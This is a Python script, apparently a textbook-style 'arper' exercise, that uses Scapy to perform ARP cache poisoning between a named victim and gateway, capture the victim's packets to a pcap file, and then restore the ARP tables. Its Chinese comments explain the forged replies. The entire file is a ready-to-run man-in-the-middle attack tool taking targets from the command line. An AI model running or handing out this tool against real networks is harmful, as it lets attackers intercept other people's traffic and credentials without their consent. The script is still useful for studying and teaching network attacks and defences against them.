from multiprocessing import Process
from scapy.all import sniff,conf,get_if_addr,send,sndrcv,srp,wrpcap
from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP

import os
import sys
import time

def get_mac(targetip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has",pdst=targetip)
    resp,_ = srp(packet,timeout=2,retry=10,verbose=False)
    for _,r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self,victim,gateway,interface="en0"):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        conf.use_pcap = True

        print(f"Initialized {interface}:")
        print(f"Gateway ({gateway}) is at {self.gatewaymac}")
        print(f"Victim ({victim}) is at {self.victimmac}")
        print("-"*30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        # 构造欺骗受害者的ARP包，源IP地址是网关，源MAC地址是黑客，目的IP地址是受害者，目的MAC地址是受害者
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f"ip src:{poison_victim.psrc}")
        print(f"ip dst:{poison_victim.pdst}")
        print(f"mac dst:{poison_victim.hwdst}")
        print(f"mac src:{poison_victim.hwsrc}")
        print(poison_victim.summary())
        print("-"*30)
        # 构造欺骗网关的ARP包，源IP是受害者，源MAC地址是黑客，目的IP是网关，目的MAC地址是网关
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f"ip src:{poison_gateway.psrc}")
        print(f"ip dst:{poison_gateway.pdst}")
        print(f"mac dst:{poison_gateway.hwdst}")
        print(f"mac src:{poison_gateway.hwsrc}")
        print(poison_gateway.summary())
        print("-"*30)
        print(f"Beginning the ARP poison.[CTRL-C to stop]")

        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(1)

    def sniff(self,count=50):
        time.sleep(5)
        print(f"Sniffing {count} packets")
        bpf_filter = "ip host %s"%self.victim
        packets = sniff(count=count,filter=bpf_filter,iface=self.interface)
        wrpcap("arper.pcap",packets)
        print("Got the packets")
        self.restore()
        self.poison_thread.terminate()
        print("Finished.")

    def restore(self):
        print("Restoring ARP tables...")
        send(ARP(op=2,psrc=self.gateway,hwsrc=self.gatewaymac,pdst=self.victim,hwdst="ff:ff:ff:ff:ff:ff"),count=15)
        send(ARP(op=2,psrc=self.victim,hwsrc=self.victimmac,pdst=self.gateway,hwdst="ff:ff:ff:ff:ff:ff"),count=15)

if __name__ == "__main__":
    (victim,gateway,interface) = (sys.argv[1],sys.argv[2],sys.argv[3])
    myarp = Arper(victim,gateway,interface)
    myarp.run()